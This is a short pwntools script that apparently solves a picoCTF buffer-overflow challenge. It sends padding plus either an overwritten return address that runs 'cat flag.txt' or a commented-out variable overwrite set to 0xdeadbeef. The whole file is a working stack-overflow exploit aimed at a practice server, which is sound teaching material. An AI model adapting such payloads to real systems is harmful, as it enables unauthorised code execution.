from pwn import *

#Sets remote host and port
p = remote("mars.picoctf.net", 31890)

#Only one of the payloads below will work at a time

#This overwrites the instruction pointer, jumps to `0x0040077e`, and thus executes `cat flag.txt`
########## Use This or The Other One ###############

payload = b"A"*280 
payload += p64(0x0040077e)

####################################################


#This overwrites the variable to make it equal to "0xdeadbeef", which prints us the flag
######### Use This or The Other One ################

#payload = b"A"*264 
#payload += p64(0xdeadbeef)

####################################################
p.sendline(payload)

p.interactive()

